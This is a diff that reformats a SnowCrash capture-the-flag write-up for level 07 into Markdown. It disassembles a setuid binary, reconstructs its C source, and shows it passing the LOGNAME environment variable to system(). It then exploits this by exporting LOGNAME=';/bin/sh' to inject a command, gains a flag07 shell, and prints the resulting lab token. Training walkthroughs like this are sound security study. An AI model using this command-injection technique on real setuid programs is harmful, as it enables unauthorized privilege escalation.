@@ -1,25 +1,29 @@
-****************************************
-*               Level 07               *
-****************************************
+# Level 07
 
-Description :
+## Description
 
 Let's explore :
 
+```
 level07@SnowCrash:~$ ls
 level07
+```
 
 There is a binary and nothing else, let's run it :
 
+```
 level07@SnowCrash:~$ ./level07
 level07
+```
 
 Nothing interesting, it just prints its name...
 
 Let's see its permissions :
 
+```
 level07@SnowCrash:~$ ls -la level07
 -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+```
 
 So, this too has the same 's' flag like the binary in level 6 (and here too the owner is "flag07")
 
@@ -27,13 +31,16 @@ So, maybe we need to exploit this binary in some way ? Maybe we can make it exec
 
 Let's examine the permissions :
 
+```
 level07@SnowCrash:~$ ls -la level07
 -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+```
 
 So, this means that this file runs as flag07 !
 
 Ok, let's try to disassemble it using gdb :
 
+```
 (gdb) disas main
 Dump of assembler code for function main:
    0x08048514 <+0>:     push   %ebp
@@ -74,10 +81,11 @@ Dump of assembler code for function main:
    0x080485a0 <+140>:   ret    
 ---Type <return> to continue, or q <return> to quit---
 End of assembler dump.
-
+```
 
 We can deduct that the code (which only has a main function), must have this look in C :
 
+```c
 #include <sys/types.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -102,6 +110,7 @@ int main(int argc, char **argv, char **envp)
 
     system(buffer);					// call the system with the "buffer" string (that now contains "/bin/echo <something>" = this executes a shell command)
 }
+```
 
 This seems similar to the binary we found in "level03" (but here we have a "buffer" string that holds a shell command which we can edit/spoof with the present "asprintf"). It's just that now at the end the code executes a shell command that is built from an environment variable named "LOGNAME" (that we can see its current value is "level07" when runnning "env").
 
@@ -111,16 +120,20 @@ So from all these, we can easily understand what the exploit is, we must :
 - run the binary "level07", it will read the "LOGNAME" and will run your shellcode and open a terminal inside its proper execution as/with "flag07" priviledges
 - inside this elevated shell, we type the command "getflag" (you are "flag07" now) to get the next flag
 
+```
 level07@SnowCrash:~$ export LOGNAME=';/bin/sh'
 level07@SnowCrash:~$ ./level07
 
 $ getflag
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 $ exit
+```
 
 Let's use it :
 
+```
 level07@SnowCrash:~$ su level08
 Password: fiumuikeil55xe9cu4dood66h
 
 level08@SnowCrash:~$ 
+```
